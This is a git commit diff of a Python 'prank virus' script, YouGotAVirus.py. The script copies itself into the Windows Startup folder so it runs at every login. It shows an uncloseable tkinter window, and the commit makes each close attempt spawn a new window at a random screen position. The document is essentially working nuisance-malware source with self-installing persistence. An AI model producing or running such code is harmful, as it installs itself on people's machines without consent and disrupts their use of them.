79a19e0e013ff4ed16b8fa96a1c53aee28ae5381
Lovely Disease <83523587+CPScript@users.noreply.github.com>
2023-09-01 11:50:31 -0400

    Update YouGotAVirus.py

--- YouGotAVirus/YouGotAVirus.py
+++ YouGotAVirus/YouGotAVirus.py
@@ -1,9 +1,8 @@
 import tkinter as tk
 from tkinter import font
+import random
 import os
 import shutil
-import sys
-import time
 
 # Get the current script's path
 script_path = os.path.abspath(__file__)
@@ -13,25 +12,43 @@ startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Sta
 
 # Check if the script is already in the startup folder
 startup_script_path = os.path.join(startup_folder, os.path.basename(script_path))
-if os.path.exists(startup_script_path):
-    print(" ")
-
-else:
+if not os.path.exists(startup_script_path):
     # Copy the script to the startup folder
     shutil.copy2(script_path, startup_script_path)
+    print("Hello >.<")
+    print("I'm your silly little virus :D")
 
+def create_new_window():
+    new_window = tk.Tk()
+    new_window.title("Siwwy wittle virus <3")
+    new_window.protocol("WM_DELETE_WINDOW", lambda: create_new_window())
 
-time.sleep(30)
+    # Remove the minimize and maximize buttons
+    new_window.attributes('-toolwindow', 1)
 
+    # Remove the maximize button from the window decorations
+    new_window.resizable(False, False)
 
-def disable_close_button():
-    pass
+    # Create a bold font
+    bold_font = font.Font(weight="bold")
+
+    label = tk.Label(new_window, text="Im just a silly little virus >.<", fg="red", font=bold_font)
+    label.pack()
+
+    # Position the new window randomly on the screen
+    screen_width = new_window.winfo_screenwidth()
+    screen_height = new_window.winfo_screenheight()
+    x = random.randint(0, screen_width - 200)
+    y = random.randint(0, screen_height - 10)
+    new_window.geometry(f"200x20+{x}+{y}")
+
+    new_window.mainloop()
 
 root = tk.Tk()
-root.title("Siwwy Wittle Viwus")
+root.title("Siwwy wittle virus :p")
 
 # Disable window close button
-root.protocol("WM_DELETE_WINDOW", disable_close_button)
+root.protocol("WM_DELETE_WINDOW", lambda: create_new_window())
 
 # Remove the minimize and maximize buttons
 root.attributes('-toolwindow', 1)
@@ -42,7 +59,7 @@ root.resizable(False, False)
 # Create a bold font
 bold_font = font.Font(weight="bold")
 
-label = tk.Label(root, text="Hello! \n Im here to remind you 'you have a virus'... \n That virus is me <3", fg="red", font=bold_font)
+label = tk.Label(root, text="Hello, your computer has a virus\n a silly little virus\n That virus is me :p", fg="red", font=bold_font)
 label.pack()
 
 root.mainloop()
